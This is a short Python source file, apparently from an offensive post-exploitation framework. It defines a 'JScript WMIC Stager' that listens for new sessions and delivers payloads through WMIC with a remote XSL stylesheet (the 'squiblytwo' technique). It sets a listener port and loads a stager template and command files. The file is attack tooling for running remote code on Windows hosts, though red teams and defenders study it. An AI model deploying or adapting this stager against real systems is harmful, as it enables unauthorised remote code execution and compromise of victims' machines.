import core.stager

class WMICStager(core.stager.Stager):

    NAME = "JScript WMIC Stager"
    DESCRIPTION = "Listens for new sessions, using WMIC for payloads (AKA squiblytwo)"
    AUTHORS = [
            'subTee', # discovery
            'mattifestation', #discovery
            'zerosum0x0' # stager
            ]

    WORKLOAD = "js"

    def __init__(self, shell):
        super(WMICStager, self).__init__(shell) # stupid hack inc!
        self.options.set("ENDPOINT", self.options.get("ENDPOINT") + ".xsl")

    def load(self):
        #self.options.set("SRVPORT", 9998)
        self.port = 9996

        #self.options.set("ENDPOINT", self.options.get("ENDPOINT") + ".xsl")

        self.template = self.loader.load_script("data/stager/js/wmic/template.xsl")
        self.stagecmd = self.loader.load_script("data/stager/js/wmic/wmic.cmd")
        self.forkcmd = self.loader.load_script("data/stager/js/wmic/wmic.cmd")
